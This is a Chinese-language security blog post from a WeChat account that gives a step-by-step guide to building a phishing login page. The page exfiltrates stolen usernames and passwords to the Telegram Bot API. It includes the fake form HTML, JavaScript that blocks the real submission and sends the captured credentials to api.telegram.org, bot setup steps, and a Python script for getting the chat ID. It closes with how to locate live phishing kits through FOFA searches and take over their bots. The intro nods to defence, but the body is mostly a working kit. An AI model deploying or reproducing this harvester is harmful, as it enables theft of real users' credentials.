---
title: 利用TG收集网页钓鱼信息
url: https://mp.weixin.qq.com/s/d7UTK3m_lwtuRO_NcrPjMw
source: Doonsec's feed
date: 2026-03-16
fetch_date: 2026-03-17T04:11:36.128482
---

# 利用TG收集网页钓鱼信息

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Yvub5gSYgRibibDjib9cTfKXFjWia85UdNWlPxvygz9AoFJMUZw3H3sUibQv2xVPMTibG9WDDvfcO9hYG5wf5Xedct6JBDuMa2wYUJicdSa1Qn5qYM/0?wx_fmt=jpeg)

# 利用TG收集网页钓鱼信息

原创

Ghost Wolf Lab
Ghost Wolf Lab

Ghost Wolf Lab

![]()

在小说阅读器中沉浸阅读

## 引言

在不断演变的网络威胁环境中，网络钓鱼攻击早已脱离了粗制滥造的早期形态，演变得愈发隐蔽和精巧。如今的攻击者不仅擅长利用像素级复刻的伪造 HTML 登录页面来攻破用户的心理防线，更在窃取数据的“最后一公里”展现出了极其狡猾的一面——他们正越来越多地将目光投向了 Telegram 等合法的即时通讯平台，将其转化为数据外发的“暗道”。

传统上，黑客往往依赖自建的服务器来接收窃取的账号密码，但这些未知 IP 和域名极易被安全软件标记并拦截。为了在重重防御中隐匿行踪，现代网络钓鱼攻击开始巧妙地“寄生”于受信任的合法服务之上。通过在恶意 HTML 页面中嵌入自动化脚本，攻击者能够将受害者提交的敏感凭证，利用 Telegram Bot API 转化为加密消息，悄无声息地推送到攻击者的手机端。

由于企业防火墙和安全网关通常不会拦截流向 Telegram 的正常 HTTPS 流量，这种“滥用合法通道”的策略使得数据窃取过程如同披上了隐形斗篷，极大地增加了安全团队检测和阻断的难度。

本文将深入探讨这一结合了社会工程学与云服务滥用的威胁模型。我们将揭开“伪造登录页面与 Telegram 数据外传”协同运作背后的逻辑，分析这种攻击方式为何如此难以被传统安全手段察觉，并探讨企业和个人应如何升级防御体系，以抵御这种暗藏杀机的新型钓鱼攻击。

## 伪造登录页面并集成TG

整个攻击流程的第一步，是向用户展示一个极具迷惑性的虚假登录表单，诱导受害者输入其用户名和密码。当受害者点击“登录”按钮时，真正起作用的并非合法的验证机制，而是潜伏在网页后台的恶意 JavaScript 代码。这些代码会瞬间截获用户输入的敏感数据，随后调用 Telegram Bot API，将窃取到的凭证作为消息，直接且隐蔽地推送到攻击者的 Telegram 聊天窗口中。

为此，我们简单的创建个登录表单：

```
  <div class="login-container">
    <h2>登 录</h2>
    <form id="loginForm">
      <div class="input-group">
        <input type="text" id="username" placeholder="用户名" required>
      </div>
      <div class="input-group">
        <input type="password" id="password" placeholder="密码" required>
      </div>

      <div class="options">
        <label><input type="checkbox"> 记住我</label>
        <a href="#">忘记密码？</a>
      </div>

      <button type="submit" class="login-btn">确认登录</button>
    </form>

    <div class="social-login">
      <span>Google</span>
      <span>|</span>
      <span>Facebook</span>
    </div>
  </div>
```

接着，我们阻止实际表单的提交，并捕获用户输入的用户名和密码将其打包：

```
  <script>
    document.getElementById('loginForm').addEventListener('submit', function(event) {
      event.preventDefault();

      var username = document.getElementById('username').value;
      var password = document.getElementById('password').value;

      var payload = `💡 Info:\n用户: ${username}\n密码: ${password}\n时间: ${new Date().toLocaleString()}`;

      sendToTelegram(payload);

      // 测试反馈
      alert("登录请求已发送至测试后端 (TG Bot)");
    });
```

捕获到的凭据会通过TG api以 `GET` 请求方式发送到机器人：

```
function sendToTelegram(message) {
      // 请确保以下信息的准确性
      var chatId = '[ChatID]';
      var botToken = '[Token]';
      var apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

      var xhr = new XMLHttpRequest();
      xhr.open("POST", apiUrl, true);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

      var postData = `chat_id=${chatId}&text=${encodeURIComponent(message)}`;
      xhr.send(postData);
    }
```

现在，我们就需要准备对应的TG机器人了。

## 创建机器人

我们需要在TG中搜索@BotFather并输入 `/newbot` 指令，即可创建一个新的机器人。

然后，分别输入机器人的名称和唯一链接名，即可获取机器人的Token。

![](https://mmbiz.qpic.cn/mmbiz_png/Yvub5gSYgRibLgDqiby8g8jW9eXyZJgZ5zo9wPy7nmlEA28cRtWadJ2tHCNFO65Z8rsoQCS9HKfBJ6jIGA0tqgibr6djhDsU6Ggu7U9KnSReXQ/640?wx_fmt=png&from=appmsg&quot)

我们还需要获取我们的ChatID，有两种方法。第一种比较简单的方法就是在TG中搜索 `@userinfobot` ，即可显示你的ChatID。

![](https://mmbiz.qpic.cn/mmbiz_png/Yvub5gSYgRibjc8988cibuxYKxa2YT6eK9ttflqF8YyxH3ibj9LKhF9hQdxV7m0NZlVu84kJSNI5oKElUoZn6YPr1tCBM1f2BcFTAicibtkEN0Pc/640?wx_fmt=png&from=appmsg&quot)

另一种方式就是使用Python脚本：

```
#!/usr/bin/env python

import logging

from telegram import ForceReply, Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
# set higher logging level for httpx to avoid all GET and POST requests being logged
logging.getLogger("httpx").setLevel(logging.WARNING)

logger = logging.getLogger(__name__)

# Define a few command handlers. These usually take the two arguments update and
# context.
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
"""Send a message when the command /start is issued."""
    user = update.effective_user
    await update.message.reply_html(
        rf"Hi {user.mention_html()}!",
        reply_markup=ForceReply(selective=True),
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
"""Send a message when the command /help is issued."""
    await update.message.reply_text("Help!")

async def echo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
"""Echo the user message."""
print(update.message.chat_id)
    await update.message.reply_text(update.message.text)

def main() -> None:
"""Start the bot."""
# Create the Application and pass it your bot's token.
    application = Application.builder().token("[Token]").build()

# on different commands - answer in Telegram
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))

# on non command i.e message - echo the message on Telegram
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, echo))

# Run the bot until the user presses Ctrl-C
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
```

然后在Python的虚拟化环境中安装依赖包：

```
python3 -m pip install python-telegram-bot
```

设置Token后，运行该脚本即可显示你的ChatID。

![](https://mmbiz.qpic.cn/mmbiz_png/Yvub5gSYgR8LkAtwDfOSWZMNvTh8ZLNdZqo1JvHvkHh0icWNzVM61vHFCTbS41pA1JMkztck4Mo7SeBkaDRCZofuTZLzTXl2SAn4BTAWjME0/640?wx_fmt=png&from=appmsg&quot)

最后，分别将ChatID和Token填入到网页页面中即可制作完成搭建。

## 演示

首先，打开我们的模拟登录页面并输入凭据。

![](https://mmbiz.qpic.cn/mmbiz_png/Yvub5gSYgRibHiaJoXdiaBWRUalut5bK11EibMBrt0EMg13qRQFsGdMqWk95FZQAah7viarQnFse1F2K7shGcxJzichHVpJx2G6icMfKicvDSCm1Zo8/640?wx_fmt=png&from=appmsg&quot)

点击确认登录，凭据就会通过POST请求发送到TG机器人。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Yvub5gSYgR9vgTyXOhglgG8wuS0CCwDOA1gpQqcPQgVWzicyHwKDa2UqmWJh7hcdE52JI42JKKXkAOsT5ibCsiaXmia5LAW8zNhQcglNiaxdSsW0/640?wx_fmt=png&from=appmsg&quot)

非常的Perfect！

## 在野实例

有相当多的钓鱼实例在网络上运行，我们可以在fofa中搜索 `"api.telegram.org/bot"`，即可查看到有关的实例。

![](https://mmbiz.qpic.cn/mmbiz_png/Yvub5gSYgRibXTZfOXaCKmLZNYwFAu7Ebrk5HPy8yt3TC0c9icfIQxn7euhlicRrnLTKcphNHddkbicoucaG9VsaicReeibUvSxTBr48xXAibmaZZI/640?wx_fmt=png&from=appmsg&quot)

点击对应地址左下角的网站主体，通过快速过滤即可查找到对应的Token和ChatID。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Yvub5gSYgRicIJwX8lDfnMmEpVcoNIAKlC0ibXAgwLkMnCmDibrxpj18icu39WlXafCrRKOnba03mst4SEgutVWicfyxch15pkOKibQWwzpydIgXk/640?wx_fmt=png&from=appmsg&quot)

有了Token和ChatID后，我们就可以使用第三方工具来获取机器人的信息，从而Black eat Black。

如：

https://github.com/0x6rss/matkap

![](https://mmbiz.qpic.cn/mmbiz_png/Yvub5gSYgR8Q1gDnHvyd4dXLM83K8omfTOVa8qxXUpRgeDwM0rsjV5DafkdwkAYwffLWR8GlEmX2eTvtLlpBI7rN2d8OsZhtlYSnhtu8Z6k/640?wx_fmt=png&from=appmsg&quot)

或者在线网站：http://matkap.cti.monster/ (目前打不开，生死不明就是寄了)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Yvub5gSYgRicZELtDMvar2mVzHe7jWoTSOaibH8johiazkG1lOIxnmxrLkVaOE7y8GhCxhI0WjInhtYpnKYlkLXOx6aJPFDHPGUo7wqkHJMqH4/640?wx_fmt=jpeg&from=appmsg&quot)

当然，攻击者不止可以通过网页钓鱼来窃取凭据，也可以利用TG机器人作为C2使用。我们将会在课程中提供不同系统利用TG机器人的方法。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/5F1cGSkUffMjPelmXP6PVz3ggEh1icEAF87iaeIb4TlVN9ZPSUCrNXlBqYYNIT7EjRhT5QBTZawC4Iro4ia1MZFEw/0?wx_fmt=png)

Ghost Wolf Lab

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/5F1cGSkUffMjPelmXP6PVz3ggEh1icEAF87iaeIb4TlVN9ZPSUCrNXlBqYYNIT7EjRhT5QBTZawC4Iro4ia1MZFEw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过